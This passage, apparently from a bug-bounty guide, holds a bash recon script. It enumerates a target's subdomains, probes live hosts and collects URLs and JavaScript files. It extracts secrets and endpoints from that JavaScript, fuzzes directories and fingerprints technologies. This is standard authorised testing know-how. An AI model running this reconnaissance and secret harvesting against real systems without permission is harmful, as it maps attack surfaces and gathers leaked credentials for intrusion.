subfinder -d $TARGET -silent -o $OUTPUT_DIR/subdomains/subfinder.txt
assetfinder --subs-only $TARGET >> $OUTPUT_DIR/subdomains/assetfinder.txt
amass enum -passive -d $TARGET -o $OUTPUT_DIR/subdomains/amass.txt
cat $OUTPUT_DIR/subdomains/*.txt | sort -u > $OUTPUT_DIR/subdomains/all-subdomains.txt

echo "[+] Phase 2: Probing Live Hosts"
cat $OUTPUT_DIR/subdomains/all-subdomains.txt | httpx -silent -o $OUTPUT_DIR/subdomains/live-hosts.txt

echo "[+] Phase 3: URL Collection"
cat $OUTPUT_DIR/subdomains/live-hosts.txt | waybackurls | tee $OUTPUT_DIR/urls/wayback.txt
cat $OUTPUT_DIR/subdomains/live-hosts.txt | gau >> $OUTPUT_DIR/urls/gau.txt
cat $OUTPUT_DIR/urls/*.txt | sort -u > $OUTPUT_DIR/urls/all-urls.txt

echo "[+] Phase 4: JS File Discovery"
cat $OUTPUT_DIR/urls/all-urls.txt | grep "\.js$" | httpx -mc 200 -silent > $OUTPUT_DIR/js/live-js.txt

echo "[+] Phase 5: Secret Extraction from JS"
cat $OUTPUT_DIR/js/live-js.txt | while read url; do
    python3 /path/to/SecretFinder.py -i $url -o cli >> $OUTPUT_DIR/js/secrets.txt
done

echo "[+] Phase 6: Endpoint Extraction"
cat $OUTPUT_DIR/js/live-js.txt | while read url; do
    python3 /path/to/linkfinder.py -i $url -o cli >> $OUTPUT_DIR/endpoints/linkfinder.txt
done

echo "[+] Phase 7: Parameter Discovery"
cat $OUTPUT_DIR/urls/all-urls.txt | unfurl -u keys | sort -u > $OUTPUT_DIR/params/discovered-params.txt

echo "[+] Phase 8: Directory Fuzzing (Top 10 Hosts)"
head -10 $OUTPUT_DIR/subdomains/live-hosts.txt | while read host; do
    ffuf -w /path/to/wordlist.txt -u $host/FUZZ -mc 200,301,302,403 -o $OUTPUT_DIR/endpoints/ffuf-$(echo $host | tr '/:' '_').json
done

echo "[+] Phase 9: Technology Fingerprinting"
cat $OUTPUT_DIR/subdomains/live-hosts.txt | while read host; do
    whatweb -a 3 $host >> $OUTPUT_DIR/tech-stack.txt
done

echo "[+] Phase 10: IP Resolution"
cat $OUTPUT_DIR/subdomains/all-subdomains.txt | dnsprobe -silent | tee $OUTPUT_DIR/ips/resolved-ips.txt

echo "[+] Phase 11: Screenshots (Optional - requires gowitness or eyewitness)"
# cat $OUTPUT_DIR/subdomains/live-hosts.txt | gowitness file -f - -P $OUTPUT_DIR/screenshots/

echo "[+] Recon Complete! Results saved in: $OUTPUT_DIR"
echo "[+] Summary:"
echo "    - Subdomains found: $(wc -l < $OUTPUT_DIR/subdomains/all-subdomains.txt)"
echo "    - Live hosts: $(wc -l < $OUTPUT_DIR/subdomains/live-hosts.txt)"
echo "    - Total URLs: $(wc -l < $OUTPUT_DIR/urls/all-urls.txt)"
echo "    - JS files: $(wc -l < $OUTPUT_DIR/js/live-js.txt)"
echo "    - Unique parameters: $(wc -l < $OUTPUT_DIR/params/discovered-params.txt)"
```

---

🚀 **Remember:** Persistence and methodology beat random fuzzing every time. Build your approach systematically, document everything, and iterate based on what you discover!